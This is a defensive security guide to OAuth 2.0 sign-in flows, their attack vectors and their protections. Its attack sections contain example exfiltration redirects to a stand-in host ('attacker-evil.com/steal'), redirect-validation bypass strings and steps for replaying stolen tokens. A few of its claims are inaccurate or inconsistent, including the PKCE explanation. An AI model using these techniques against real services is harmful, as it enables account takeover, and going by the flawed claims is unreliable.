# OAuth 2.0 Authentication: Complete Security Guide

## Table of Contents
1. [Introduction to OAuth 2.0](#introduction)
2. [OAuth 2.0 vs OpenID Connect](#oauth-vs-oidc)
3. [The Complete Sign-In Flow](#signin-flow)
4. [Real-World Example: Instagram & Gmail Login](#real-world-example)
5. [Common Attack Vectors](#attacks)
6. [Security Vulnerabilities & How Attackers Exploit Them](#vulnerabilities)
7. [Protection Mechanisms & Security Best Practices](#protection)
8. [Key Takeaways](#takeaways)

---

## Introduction to OAuth 2.0 {#introduction}

**OAuth 2.0** is an open authorization standard that allows users to grant third-party applications access to their resources without sharing their passwords directly. Instead of giving your password to an app, OAuth creates a secure delegation mechanism where the identity provider (like Google, Instagram, Facebook) handles authentication and authorization while the third-party app receives limited access tokens.

### Why OAuth 2.0?

Before OAuth, if a website wanted access to your Gmail contacts, you had to give them your Gmail password. This was extremely risky because:
- The website could see all your Gmail data, not just contacts
- The website could change your password
- You couldn't revoke access without changing your password
- If the website was hacked, attackers got your Gmail credentials

OAuth 2.0 solved this by introducing **tokens** instead of passwords.

### Key Components

| Component | Role |
|-----------|------|
| **Resource Owner** | The user (you) who has the data |
| **Client Application** | The app requesting access (e.g., Spotify, Pinterest) |
| **Authorization Server** | Where you log in and approve access (Google, Instagram, Facebook servers) |
| **Resource Server** | Where your actual data is stored (same as Authorization Server usually) |
| **Access Token** | Proof that the app has permission to access your data |

---

## OAuth 2.0 vs OpenID Connect {#oauth-vs-oidc}

This is a critical distinction that many people confuse:

### OAuth 2.0 (Authorization Only)
- **Purpose**: Controls access to resources
- **What it does**: Grants permission to access data
- **Tokens**: Access tokens only
- **Use case**: "Allow Spotify to access my Spotify playlists"

### OpenID Connect (Authentication + Authorization)
- **Purpose**: Verifies who you are AND controls access
- **What it does**: Confirms identity + grants access
- **Tokens**: ID token + Access token
- **Use case**: "Sign me in to Reddit using my Google account"

### When Which One is Used?

**Sign-in/Login scenarios** → Use OpenID Connect (which builds on OAuth 2.0)
**Access to resources** → Use OAuth 2.0

When you see "Sign in with Google" or "Sign in with Instagram", these are typically using **OpenID Connect**, which layers authentication on top of OAuth 2.0.

---

## The Complete Sign-In Flow {#signin-flow}

### OAuth 2.0 Authorization Code Flow (The Most Secure)

This is the recommended flow for applications that can securely store a secret (like web apps with a backend server).

#### Step-by-Step Process:

```
┌─────────────┐
│   Client    │                    ┌──────────────────┐
│ Application │───(1) Redirects──→ │ Authorization    │
│             │                    │ Server (Google,  │
│             │                    │ Instagram, etc)  │
│             │                    └──────────────────┘
│             │                             │
│             │      (2) User logs in      │
│             │      and approves access   │
│             │             │              │
│             │◄────(3) Redirect with──────┘
│             │       auth code
└─────────────┘
      │
      │ (4) Backend sends code + secret
      │ (secure, not through browser)
      │
      └───────────────────────────────────→ [Token Endpoint]
                                            │
                                      Returns access token
                                            │
                                      ◄─────┘
      
      Client now has access token
      Can request user data
```

#### Detailed Flow:

**Phase 1: Authorization Request (Frontend)**

```
1. User clicks "Sign in with Google/Instagram"

2. Client app redirects user to Authorization Server with:
   - client_id: Unique identifier for the app
   - redirect_uri: Where to send user after login
   - response_type: "code" (request auth code)
   - scope: What data access is needed (email, profile, etc)
   - state: Random token for security

Example URL:
GET https://accounts.google.com/oauth/authorize?
  client_id=1234567890.apps.googleusercontent.com&
  redirect_uri=https://myapp.com/callback&
  response_type=code&
  scope=openid%20profile%20email&
  state=abc123xyz789
```

**Step 1**: User's browser redirects to Google/Instagram login page
**Step 2**: User enters credentials and logs in
**Step 3**: Authorization server shows consent screen: "myapp.com wants access to your email and profile"
**Step 4**: User clicks "Allow/Approve"

**Phase 2: Authorization Grant (Still Frontend)**

```
Authorization server redirects user back to client with:
- code: One-time authorization code (expires in ~30 seconds)
- state: Same state value sent earlier (for verification)

Example redirect:
GET https://myapp.com/callback?
  code=4/0AXpV3rXz3xK...&
  state=abc123xyz789
```

**Critical Security Point**: The authorization code is NOT the access token. It's a temporary, single-use voucher that proves the user approved access.

**Phase 3: Token Exchange (Backend - Secure)**

```
3. Client application's backend receives the code

4. Backend makes a secure HTTPS POST request to Token Endpoint:
   - code: The authorization code received
   - client_id: App's public identifier
   - client_secret: App's secret (never exposed to browser)
   - redirect_uri: Must match the one used earlier
   - grant_type: "authorization_code"

Example request:
POST https://oauth2.googleapis.com/token
Content-Type: application/x-www-form-urlencoded

code=4/0AXpV3rXz3xK...&
client_id=1234567890.apps.googleusercontent.com&
client_secret=GOCSPX-AbCdEfGhIjKlMnOpQ&
redirect_uri=https://myapp.com/callback&
grant_type=authorization_code

5. Authorization server validates:
   ✓ Is this code valid?
   ✓ Is this code meant for this client_id?
   ✓ Is the client_secret correct?
   ✓ Does redirect_uri match?
   
6. If valid, returns:
   {
     "access_token": "ya29.a0AfH6S...",
     "expires_in": 3599,
     "refresh_token": "1//0gXz...",
     "token_type": "Bearer",
     "id_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6IjIz..."
   }
```

**Phase 4: Resource Access (Backend)**

```
7. Client app now has the access token

8. Client can use token to request user info:
   GET https://www.googleapis.com/oauth2/v2/userinfo
   Authorization: Bearer ya29.a0AfH6S...

9. Google returns user data:
   {
     "id": "1234567890",
     "email": "user@gmail.com",
     "verified_email": true,
     "name": "John Doe",
     "picture": "https://...",
     "locale": "en"
   }

10. Client app creates user session with this data
    User is now logged in!
```

---

## Real-World Example: Instagram & Gmail Authentication {#real-world-example}

### Scenario: User Signs into a Photo Editor with Instagram

Let's say you go to a photo editing website and want to sign in using your Instagram account.

#### What Happens:

**Your browser**:
```
1. You click "Sign in with Instagram"
2. Photo editor redirects you to:
   https://api.instagram.com/oauth/authorize?
     client_id=123456789&
     redirect_uri=https://photoeditor.com/auth/callback&
     scope=user_profile,user_media&
     state=randomtoken123
```

**Instagram servers**:
```
3. Instagram checks if you're logged in
   - If not, shows login form
   - If yes, shows consent screen
   
4. You see: "photoeditor.com wants to access:
   • Your profile information
   • Your photos and videos"
   
5. You click "Allow"
```

**Back to photo editor**:
```
6. Instagram redirects you:
   https://photoeditor.com/auth/callback?
     code=ABC123DEF456&
     state=randomtoken123

7. Photo editor's backend receives this code

8. Photo editor's backend (SECRET!) makes request to Instagram:
   POST https://graph.instagram.com/v18.0/oauth/access_token
   
   Sending:
   - code=ABC123DEF456
   - client_id=123456789
   - client_secret=SUPER_SECRET_KEY_NEVER_SHARED
   - redirect_uri=https://photoeditor.com/auth/callback

9. Instagram validates everything and sends back:
   - access_token (your ticket to Instagram)
   - user_id
   - expires_in

10. Photo editor stores your Instagram access token
    (usually encrypted in their database)

11. Photo editor now can:
    - Fetch your profile picture
    - List your posts
    - Display them in the editor
    
12. You're logged in and can edit your photos!
```

### Gmail Authentication (Similar Process)

The process is nearly identical, just different servers:

```
1. Click "Sign in with Gmail"
2. Redirected to accounts.google.com (Google's auth server)
3. Enter Gmail credentials or use existing session
4. Approve access scopes
5. Google sends auth code to your app
6. Your app's backend trades code for access_token
7. Your app requests Gmail data (email, contacts, etc)
8. You're logged in!
```

### Key Difference Between Platforms:

**Instagram**:
- May ask for `user_profile` scope (name, photo, bio)
- May ask for `user_media` scope (access to posts)
- Recently moved to require Facebook Login for some apps

**Gmail**:
- Can request `openid` (confirm identity)
- Can request `profile` (name, picture)
- Can request `email` (email address)
- Can request `drive` (access to Google Drive)
- Can request more granular scopes

**The principle is identical** - the user approves what data is shared, and a secure token exchange happens on the backend.

---

## Common Attack Vectors {#attacks}

### Attack 1: Redirect URI Manipulation / Open Redirect

#### How It Works:

The attacker modifies the `redirect_uri` parameter to point to their own server instead of the legitimate app.

```
Normal flow:
GET https://accounts.google.com/oauth/authorize?
  client_id=LEGIT_ID&
  redirect_uri=https://legitimateapp.com/callback&
  ...

Attacker's malicious link:
GET https://accounts.google.com/oauth/authorize?
  client_id=LEGIT_ID&
  redirect_uri=https://attacker-evil.com/steal&
  ...
```

#### Attack Scenario:

```
1. User receives email: "Verify your account at legitimateapp.com"
   (Link actually points to attacker's malicious authorization URL)

2. User clicks link, gets redirected to Google login
   Doesn't realize the redirect_uri is wrong

3. User logs in with their Google account

4. Google redirects user to attacker's server:
   https://attacker-evil.com/steal?
     code=REAL_AUTHORIZATION_CODE&
     state=...

5. Attacker now has the real authorization code!

6. Attacker's backend trades this code for access token:
   POST https://oauth2.googleapis.com/token
   code=REAL_AUTHORIZATION_CODE&
   client_id=LEGIT_ID&
   client_secret=...&
   redirect_uri=https://attacker-evil.com/steal

7. Attacker gets a token for accessing the victim's data!

8. Attacker can now:
   - Read user's email
   - Access Google Drive
   - Modify user data
   - Impersonate the user on the app
```

#### Variant: Path Confusion Attack

If the app uses path-based validation:

```
App whitelists: https://legitimateapp.com/

But doesn't validate the full path!

Attacker uses:
https://legitimateapp.com/redirect?next=https://evil.com

Or:
https://legitimateapp.com%2F..%2F@evil.com
(URL encoding tricks to bypass validation)
```

---

### Attack 2: Authorization Code Interception

#### How It Works:

The attacker intercepts the authorization code from the redirect URL.

```
Victim's browser receives:
GET https://legitimateapp.com/callback?code=ABC123...

Attacker somehow intercepts this in transit
(man-in-the-middle attack on non-HTTPS connection)

Or:

Attacker tricks browser to share the URL
(phishing, logging HTTP traffic, browser extensions, etc)
```

#### Attack Scenario:

```
1. User is on public WiFi at a coffee shop

2. Attacker is using WiFi sniffer and intercepts HTTP traffic

3. User clicks "Sign in with Google"
   (If the site uses HTTP instead of HTTPS!)

4. During the OAuth flow, attacker intercepts the redirect URL:
   https://app.com/callback?code=ABC123XYZ

5. Attacker now has the authorization code

6. Before legitimate user completes the flow,
   attacker redeems the code:
   
   POST https://oauth2.googleapis.com/token
   code=ABC123XYZ&
   client_id=APP_ID&
   client_secret=APP_SECRET&
   ...

7. Attacker gets access token
   → Can impersonate the victim
   → Can access their data
```

---

### Attack 3: CSRF (Cross-Site Request Forgery) - Missing State Parameter

#### How It Works:

The attacker tricks the victim into clicking a link that completes the OAuth flow with the **attacker's account**.

```
The vulnerability happens when:
- State parameter is missing
- State parameter isn't validated
```

#### Attack Scenario:

```
1. Attacker has their own account on "photoeditor.com"

2. Attacker goes to photoeditor.com and starts the OAuth flow:
   GET https://api.instagram.com/oauth/authorize?
     client_id=PHOTOEDITOR_ID&
     redirect_uri=https://photoeditor.com/callback&
     scope=user_profile&
     state=MISSING_OR_IGNORED

3. Attacker gets redirected back with authorization code:
   https://photoeditor.com/callback?code=ATTACKER_CODE

4. Attacker clicks on callback URL in address bar
   and copies it (or uses interceptor)

5. Attacker now crafts a malicious link:
   https://photoeditor.com/callback?code=ATTACKER_CODE

6. Attacker sends this link to victim:
   "Check out this cool photo editor!"

7. Victim clicks the link (while already logged into photoeditor.com)

8. Victim's browser is redirected to:
   https://photoeditor.com/callback?code=ATTACKER_CODE

9. Photoeditor sees the callback and processes the code
   BUT doesn't validate if this matches the original request

10. Result:
    - Victim is now logged into photoeditor.com
    - BUT with attacker's account linked!
    - All photos victim uploads go to attacker's account
    - Attacker can access everything victim does

11. Victim thinks they're using their own account
    But it's the attacker's account under the hood!
```

---

### Attack 4: Token Theft via HTTPS Downgrade or Referrer Header

#### How It Works:

Sensitive tokens are exposed through URLs or HTTP headers.

```
Vulnerability examples:

1. Using HTTP instead of HTTPS:
   GET http://app.com/callback?access_token=SECRET_TOKEN
   (Attacker on WiFi can see this!)

2. Implicit flow (deprecated):
   GET https://app.com/callback#access_token=SECRET_TOKEN
   (Token in URL fragment)

3. Referrer header leak:
   When user clicks link from app to external site,
   referrer header includes the token URL
   
   GET https://external-site.com
   Referer: https://app.com?access_token=SECRET_TOKEN
```

---

### Attack 5: Pre-Account Takeover

#### How It Works:

Attacker creates an account with victim's email before victim does.

```
Scenario:

1. App allows login with password OR OAuth (Instagram)
   But doesn't verify email during signup

2. Attacker creates account:
   Email: victim@gmail.com
   Password: attacker_password

3. Victim later signs in with Instagram OAuth
   App checks: "Is victim@gmail.com registered?"
   (Doesn't verify if it's really the victim)
   App links Instagram account to existing email

4. Now the account has:
   - Attacker's password
   - Victim's Instagram linked

5. Attacker can still log in with password!
   Attacker accesses victim's account when victim isn't using it

6. Attacker can:
   - Read all data victim enters
   - See sensitive information
   - Modify things as the victim
```

---

### Attack 6: Scope Escalation / Scope Manipulation

#### How It Works:

Attacker tricks the authorization server into granting more permissions than requested.

```
Legitimate request:
scope=email

Attacker's malicious request:
scope=email+drive+contacts+calendar

Or tricks by:
- Changing scope values
- Injecting extra scopes
- Exploiting misconfigured validation
```

---

### Attack 7: Token Reuse and Replay Attacks

#### How It Works:

Attacker captures a token and uses it multiple times (if tokens aren't invalidated).

```
1. Attacker steals access_token somehow

2. Attacker uses token to make API requests:
   GET https://www.googleapis.com/oauth2/v2/userinfo
   Authorization: Bearer STOLEN_TOKEN

3. If token hasn't expired, requests work!

4. Token could be valid for hours/days/months
   Attacker has extended access time window
```

---

## Security Vulnerabilities & How Attackers Exploit Them {#vulnerabilities}

### Vulnerability 1: Improper Redirect URI Validation

**The Problem**:
Authorization server doesn't properly validate that redirect_uri matches pre-registered values.

**How Attacker Exploits It**:
```
App registered redirect_uri: https://app.com/callback

Attacker submits: https://app.com/callback%252f@evil.com
(URL encoding tricks)

Or: https://app.com/callback?next=https://evil.com
(Parameter pollution)

Server's loose validation allows it
Server redirects to attacker's site
Attacker gets auth code
```

**Impact**: Complete account takeover

---

### Vulnerability 2: Missing or Weak State Parameter Validation

**The Problem**:
- State parameter not used
- State parameter not validated
- Same state value used for multiple requests

**How Attacker Exploits It**:
```
1. Attacker completes OAuth flow with their account
   Gets callback: https://app.com/callback?code=ATTACK_CODE&state=state123

2. Attacker sends this to victim

3. Victim clicks it (while already logged in to app)

4. App doesn't check if state matches original request
   (Because no state is validated)

5. App processes attacker's code as if victim authorized it

6. Victim's account is now linked to attacker's OAuth account!
```

**Impact**: Account hijacking, CSRF attacks

---

### Vulnerability 3: Using HTTP Instead of HTTPS

**The Problem**:
Communication with authorization server or redirect URIs use unencrypted HTTP.

**How Attacker Exploits It**:
```
1. User on public WiFi

2. Attacker runs Wireshark (packet sniffer)

3. Intercepts HTTP traffic

4. Sees: GET http://app.com/callback?code=ABC123&access_token=XYZ

5. Attacker copies the token

6. Attacker uses token to access victim's data

7. Since HTTP is unencrypted, attacker can read everything
```

**Impact**: Token theft, account compromise

---

### Vulnerability 4: Implicit Grant Flow (Deprecated)

**The Problem**:
Old OAuth flow that returns access token directly in URL fragment instead of using authorization code + backend exchange.

```
GET https://app.com/callback#access_token=SECRET

Problems:
- Token exposed in browser history
- Token exposed in referrer headers
- Token exposed in logs
- Can't be revoked effectively
```

**How Attacker Exploits It**:
```
1. Attacker accesses victim's browser history

2. Finds URLs like:
   https://app.com/callback#access_token=REAL_TOKEN

3. Uses the token to access victim's data

Or:

1. Victim clicks link from app to external site
2. Referrer header sent:
   Referer: https://app.com/callback#access_token=TOKEN
3. External site logs this
4. Attacker compromises external site
5. Attacker finds tokens in logs
```

**Impact**: Token exposure, account compromise

**Status**: This flow is deprecated and should NOT be used

---

### Vulnerability 5: No Email Verification During Signup

**The Problem**:
App allows account creation without verifying email ownership.

**How Attacker Exploits It**:
```
1. Create account with victim's email but attacker's password

2. Later when victim uses OAuth:
   App links OAuth to "victim@email.com" account

3. That account is already controlled by attacker!

4. Attacker can still log in with password

5. Attacker has access to victim's account
```

---

### Vulnerability 6: Improper Scope Validation

**The Problem**:
Authorization server doesn't properly validate or restrict scopes.

**How Attacker Exploits It**:
```
App requested: scope=email

Attacker modifies request: scope=email+drive+contacts+calendar

Server grants all scopes!

Attacker now has access to:
- Email
- Google Drive files
- Contacts list
- Calendar
(Much more than intended!)
```

---

### Vulnerability 7: No Token Expiration / Long-Lived Tokens

**The Problem**:
Tokens don't expire or have very long expiration times.

**How Attacker Exploits It**:
```
1. Attacker steals a token

2. Normal tokens: Expire in 1 hour (limited damage window)

3. Misconfigured tokens: Valid for months or never expire

4. Attacker has extended time window to use stolen token

5. By the time anyone notices, attacker has done serious damage
```

---

## Protection Mechanisms & Security Best Practices {#protection}

### Protection 1: Use PKCE (Proof Key for Code Exchange)

**What is PKCE?**

PKCE adds an extra layer of verification to prevent authorization code interception attacks.

#### How PKCE Works:

```
Traditional Flow (vulnerable to interception):

1. Browser: Authorization request
2. Browser: Receives code in redirect
3. Backend: Exchanges code for token

If code is intercepted, attacker can use it!

PKCE Flow (protected):

1. Client generates: code_verifier = random 128 character string
   Example: "E9Mrozoa2owUe2DCdeWMd7dIQggUHSstw929yYYvrQd45aIh"

2. Client creates: code_challenge = BASE64URL(SHA256(code_verifier))

3. Client → Browser: Authorization request (includes code_challenge)
   GET https://oauth.example.com/authorize?
     client_id=...&
     code_challenge=K7gNU3sdo-OL0wNhqoVWhr3g6s1xYv9qFxLPPO3YBBM&
     code_challenge_method=S256&
     ...

4. Browser → Authorization Server: User logs in and approves

5. Authorization Server → Browser: Sends authorization code
   (Server stores which code_challenge this code is tied to)

6. Browser → Backend: Receives code

7. Backend → Authorization Server: 
   Token request including code_verifier
   
   POST https://oauth.example.com/token
   code=abc123&
   code_verifier=E9Mrozoa2owUe2DCdeWMd7dIQggUHSstw929yYYvrQd45aIh&
   ...

8. Authorization Server:
   ✓ Receives code_verifier
   ✓ Calculates SHA256(code_verifier) = K7gNU3sdo-OL0wNhqoVWhr3g6s1xYv9qFxLPPO3YBBM
   ✓ Checks if it matches stored code_challenge
   ✓ If match → Grant token
   ✓ If no match → Reject (attacker intercepted!)

Why it works:

- Even if attacker intercepts the code
- They DON'T have the code_verifier
- They can't complete the token exchange
- Code becomes useless

The math:
- Hash function is one-way
- If attacker only has code_verifier, they can't create matching code_challenge
- If attacker has code but not verifier, they can't exchange it
```

**When to Use PKCE**:
- All modern applications (mandatory in OAuth 2.1)
- Especially critical for public clients (mobile apps, SPAs)
- Even for web apps with backend (still adds security)

**Implementation Note**:
```
code_challenge_method can be:
- S256 (SHA256 hash) - RECOMMENDED
- plain (just use code_verifier as-is) - NOT RECOMMENDED
```

---

### Protection 2: Validate State Parameter

**What is State?**

State is a random token that proves the current request matches the original authorization request.

#### How State Protection Works:

```
Correct Implementation:

1. User clicks "Sign in with Google"

2. Backend generates:
   state = random 32-byte token (never guessable)
   
3. Backend stores state in session/cookie:
   session.state = "randomtoken123xyz"

4. Backend redirects to authorization endpoint:
   GET https://oauth.example.com/authorize?
     state=randomtoken123xyz&
     ...

5. User logs in and approves

6. Authorization server redirects back:
   GET https://app.com/callback?code=abc123&state=randomtoken123xyz

7. Backend receives callback:
   - Extracts state from URL: randomtoken123xyz
   - Compares with session.state
   - ✓ MATCH! → Process normally
   - ✗ NO MATCH! → REJECT (potential CSRF attack!)

8. Only if state matches, process the code and create session

CSRF Attack Prevention:

Attacker tries CSRF:
GET https://app.com/callback?code=ATTACKER_CODE&state=WRONG_STATE

Backend checks: 
- URL state: WRONG_STATE
- Session state: randomtoken123xyz
- NO MATCH → REJECT
- Attacker's CSRF fails!

Why it works:
- Attacker can intercept and use someone else's code
- But attacker can't predict the state value
- Attacker can't change the victim's session
- State mismatch reveals the attack
```

**Implementation Best Practices**:
```
✓ Generate cryptographically random state (32+ bytes)
✓ Store state securely in session (httpOnly cookie)
✓ Validate state on callback
✓ Use each state for only one OAuth flow
✓ Expire state after reasonable time (5-10 minutes)
```

---

### Protection 3: Validate Redirect URI

**The Problem We're Solving**:
Ensure authorization codes/tokens only go to legitimate app URLs, not attacker servers.

#### How Redirect URI Validation Works:

```
Proper Validation:

1. During app registration, developer specifies:
   Allowed Redirect URIs:
   - https://app.com/callback
   - https://app.com/auth/google/callback
   - https://app.com/mobile/callback

2. Authorization server stores whitelist of allowed URIs

3. During OAuth flow, user comes with:
   redirect_uri=https://app.com/callback

4. Authorization server checks:
   ✓ Is this in the whitelist?
   ✓ Is this an exact match?
   
5. If YES:
   - Send authorization code to this URI
   
6. If NO:
   - REJECT the entire request
   - Show error to user

Attacker Attempts:

Attempt 1 - Direct manipulation:
redirect_uri=https://attacker.com
→ NOT in whitelist → REJECTED

Attempt 2 - URL encoding tricks:
redirect_uri=https://app.com%2f%2f@attacker.com
→ After decoding = https://app.com//attacker.com
→ NOT an exact match → REJECTED

Attempt 3 - Parameter pollution:
redirect_uri=https://app.com/callback?next=https://attacker.com
→ NOT an exact match → REJECTED

Attempt 4 - Subdomain tricks:
redirect_uri=https://attacker.com.app.com
→ NOT in whitelist → REJECTED
```

**Implementation Best Practices**:
```
✓ Whitelist specific, full redirect URIs (not wildcards)
✓ Validate EXACT match (not partial, not substring)
✓ Always use HTTPS for redirect URIs
✓ Don't use localhost in production
✓ Validate before showing consent screen
✓ Remove trailing slashes when comparing
✓ Never allow redirect_uri parameter in authorization request
  (Always pre-register)
```

---

### Protection 4: Use HTTPS Only

**The Problem We're Solving**:
Prevent eavesdropping on sensitive data in transit.

#### How HTTPS Protection Works:

```
HTTP (Insecure):
Browser ←→ Server
All data visible in plaintext to anyone on network

HTTPS (Secure):
Browser ←→ Server (encrypted)
Data encrypted with TLS/SSL
- Attacker can't read traffic
- Attacker can't modify traffic
- Attacker can't inject code

OAuth tokens must ALWAYS travel over HTTPS
```

**Implementation**:
```
✓ Use HTTPS for all OAuth endpoints
✓ Redirect HTTP → HTTPS automatically
✓ Use valid SSL/TLS certificates
✓ Enable HSTS (HTTP Strict Transport Security)
✓ Disable old TLS versions (use TLS 1.2+)

Example HSTS header:
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

---

### Protection 5: Secure Token Storage

**The Problem We're Solving**:
Prevent stolen tokens from being easily used by attackers.

#### How to Store Tokens Securely:

```
Client-Side Token Storage:

❌ DON'T: Store in localStorage
   Why: Accessible to JavaScript/XSS attacks
   
❌ DON'T: Store in URL/querystring
   Why: Exposed in browser history, referrer headers, logs
   
✓ DO: Store in httpOnly cookie
   Why: Not accessible to JavaScript
        Only sent in HTTP requests (not to external sites)
        
✓ DO: Use SameSite=Strict cookie flag
   Why: Prevents CSRF attacks
        Cookie not sent to third-party sites

Example:
Set-Cookie: session_token=abc123; 
            httpOnly; 
            Secure;
            SameSite=Strict;
            Max-Age=3600

Backend Token Storage:

✓ Encrypt tokens at rest
✓ Use strong encryption (AES-256)
✓ Store in secure database
✓ Never log tokens
✓ Hash token identifiers
✓ Implement token rotation
✓ Monitor token usage patterns
```

---

### Protection 6: Implement Token Expiration

**The Problem We're Solving**:
Limit the time window an attacker can use a stolen token.

#### How Token Expiration Works:

```
Without expiration:
- Attacker steals token
- Token valid forever
- Attacker has unlimited time window

With expiration:
- Access token: 1 hour (short-lived)
- Refresh token: 7 days (long-lived)

Flow:
1. Access token issued (expires in 1 hour)

2. Token used for API requests

3. Token approaches expiration (59 minutes)

4. Client uses refresh token to get new access token:
   POST /oauth/token
   grant_type=refresh_token&
   refresh_token=refresh_abc123&
   client_id=...&
   client_secret=...

5. Authorization server validates refresh token

6. If valid, issues new access token (another 1 hour)

7. If refresh token also expired, user must re-authenticate

Benefit:
- If token stolen at minute 30:
  Attacker has only 30 minutes before token expires
  Damage window is limited

- If token stolen at minute 59:
  Attacker has only 1 minute
  Might not even notice theft occurred

- Rotation happens regularly
  - Old tokens invalidated
  - New tokens issued
  - Attack window constantly shrinking
```

**Implementation**:
```
✓ Short-lived access tokens (5-60 minutes)
✓ Longer-lived refresh tokens (days/weeks)
✓ Implement token revocation
✓ Monitor token usage patterns
✓ Force re-authentication for sensitive operations
```

---

### Protection 7: Email Verification

**The Problem We're Solving**:
Prevent attackers from registering with victim's email address.

#### How Email Verification Works:

```
Without verification:

1. Attacker creates account:
   Email: victim@gmail.com
   Password: attacker_password
   → Account created immediately!

2. Victim later uses OAuth (Instagram):
   App thinks: "Oh this email already exists!"
   App links: victim@gmail.com → victim's Instagram

3. Same account now has:
   - Attacker's password
   - Victim's Instagram

4. Attacker can still access account with password!

With verification:

1. User tries to create account:
   Email: victim@gmail.com

2. System sends verification email:
   "Click here to verify: https://app.com/verify?token=abc123"

3. Email sent to victim@gmail.com
   Only real owner can click the link

4. If victim clicks it → Email is verified

5. If attacker can't access the email → Account stays unverified

6. When victim later uses OAuth:
   App performs email verification
   Confirms victim really owns this email
   Links to correct account

Prevention:

Attacker can't create account without:
- Access to victim's actual email
- Successfully verifying their email
```

**Implementation**:
```
✓ Require email verification before account creation
✓ Require email verification before allowing OAuth link
✓ Use time-limited verification tokens
✓ Re-verify email if changed
✓ Don't trust OAuth provider's email verification
  (Verify it yourself)
```

---

### Protection 8: Scope Limitation

**The Problem We're Solving**:
Ensure apps only request and receive permissions they truly need.

#### How Scope Limitation Works:

```
Proper Scope Management:

1. App determines what data it needs:
   - Profile picture? Yes
   - Name? Yes
   - Email? Yes
   - Calendar? No
   - Drive access? No

2. During authorization request, app asks for ONLY what it needs:
   scope=profile+email+openid
   
   NOT:
   scope=profile+email+calendar+drive+contacts...

3. User sees consent screen:
   "App wants to access:
   • Your profile information
   • Your email address"

4. User approves only necessary permissions

5. App receives access token with limited scope

6. If app tries to request calendar data:
   GET https://www.googleapis.com/calendar/v3/...
   Authorization: Bearer token_with_limited_scope
   
   → Request rejected!
   → Token only has profile+email scope
   → Calendar access denied

Principle of Least Privilege:
- Ask for minimum permissions needed
- User grants what's needed
- Attacker can only access what's granted
- If attacker compromises app, limited damage

Scope Validation:

During consent:
User: "I approve profile+email scope"

User clicks approve →

Server validates:
✓ Are these scopes valid?
✓ Are they within allowed scopes for this client?
✓ Did user approve exactly these scopes?

If attacker tried to inject calendar scope:
scope=profile+email+calendar

Server checks: User only approved profile+email
Token issued with profile+email only
Calendar scope rejected!
```

**Implementation**:
```
✓ Define minimum required scopes
✓ Document why each scope is needed
✓ Update scopes as needs change
✓ Allow users to grant/revoke scopes
✓ Validate scopes on backend
✓ Use specific scopes, not generic ones
```

---

### Protection 9: Regular Security Audits

**The Problem We're Solving**:
Catch configuration mistakes and vulnerabilities before attackers do.

#### Regular Audit Checklist:

```
Configuration Audits (Monthly):
□ Verify redirect URIs are still correct
□ Check OAuth provider configurations
□ Review registered applications
□ Verify only authorized apps are registered

Code Review Audits (Per release):
□ Review all OAuth integration code
□ Check state parameter implementation
□ Verify HTTPS usage
□ Check token storage methods
□ Verify scope validation

Security Scanning (Weekly):
□ Use automated security scanners
□ Check for common vulnerabilities
□ Test redirect URI validation
□ Test CSRF protections
□ Test token expiration

Penetration Testing (Quarterly):
□ Simulate OAuth attacks
□ Try to intercept tokens
□ Attempt redirect URI bypass
□ Test CSRF protection
□ Try scope escalation

Incident Review:
□ Monitor for suspicious activity
□ Review failed login attempts
□ Check for token usage anomalies
□ Investigate error patterns
□ Track OAuth-related support tickets
```

---

### Protection 10: Keep Dependencies Updated

**The Problem We're Solving**:
OAuth libraries and dependencies sometimes have security vulnerabilities. Updates patch them.

#### Dependency Management:

```
Updates provide:
- Security patches
- Bug fixes
- Performance improvements
- New features

Don't do:
- Freeze versions indefinitely
- Ignore security warnings
- Use deprecated libraries

Do:
- Update regularly (monthly/quarterly)
- Subscribe to security notifications
- Use dependency scanning tools
  (npm audit, Snyk, DependaBot, etc)
- Test updates in staging before production
- Keep detailed changelog
```

---

## Key Takeaways {#takeaways}

### For Users:

1. **Be Cautious of URLs**
   - Check the URL in address bar
   - Verify you're on legitimate login page
   - Don't click suspicious links

2. **Review Permissions**
   - Read what app is asking for
   - Deny unnecessary permissions
   - Understand privacy implications

3. **Use HTTPS Sites**
   - Only authorize on HTTPS sites
   - Be suspicious of HTTP sites

4. **Monitor Account Access**
   - Regularly review connected apps
   - Revoke access to unused apps
   - Check login history

### For Developers:

1. **Always Use Authorization Code Flow + PKCE**
   - Never use Implicit flow (deprecated)
   - Always use PKCE for public clients
   - Use PKCE even for confidential clients

2. **Validate Everything**
   - Validate redirect_uri exactly
   - Validate state parameter
   - Validate token signatures
   - Validate scopes

3. **Use HTTPS Everywhere**
   - All OAuth endpoints must be HTTPS
   - All redirect URIs must be HTTPS
   - Enable HSTS headers

4. **Implement Security Practices**
   - Short-lived access tokens
   - Refresh token rotation
   - Secure token storage (httpOnly cookies)
   - Email verification
   - Rate limiting and monitoring

5. **Keep Security First**
   - Regular security audits
   - Stay updated with patches
   - Monitor for suspicious activity
   - Educate team about OAuth security
   - Use security libraries/SDKs

### Most Common Vulnerabilities (Priority Order):

1. **Improper redirect_uri validation** (Most dangerous!)
2. **Missing/weak state parameter**
3. **Using HTTP instead of HTTPS**
4. **Using deprecated implicit flow**
5. **No email verification**
6. **Missing PKCE**
7. **No token expiration**
8. **Improper scope validation**

### The Golden Rules:

```
1. ALWAYS validate redirect_uri (exact match to whitelist)
2. ALWAYS use state parameter and validate it
3. ALWAYS use HTTPS
4. ALWAYS use PKCE
5. ALWAYS expire tokens
6. ALWAYS verify email on signup
7. ALWAYS use backend for token exchange
8. ALWAYS keep client_secret secret
```

### Complete Security Checklist:

```
Auth Flow Implementation:
□ Using Authorization Code Flow
□ Using PKCE
□ All communication via HTTPS
□ State parameter implemented and validated
□ Redirect URI whitelisted and validated exactly

Token Management:
□ Access tokens short-lived (< 1 hour)
□ Refresh tokens long-lived
□ Tokens encrypted at rest
□ Tokens stored in httpOnly cookies
□ Token expiration implemented
□ Token revocation implemented

Security:
□ Email verification on signup
□ Scope limitation (least privilege)
□ CSRF protection via state
□ XSS protection (httpOnly cookies, CSP)
□ Rate limiting on OAuth endpoints
□ Monitoring for suspicious activity
□ Regular security audits
□ Dependencies up to date

User Controls:
□ Users can view connected apps
□ Users can revoke app access
□ Users can see scope permissions
□ Clear privacy policy
□ Transparency about data usage
```

---

## Conclusion

OAuth 2.0 is a powerful and secure protocol when implemented correctly. The key is understanding both how it works and how attacks exploit it. By following the security best practices outlined in this guide—especially proper redirect URI validation, using PKCE, validating the state parameter, and keeping tokens short-lived—you can build robust authentication systems that protect your users.

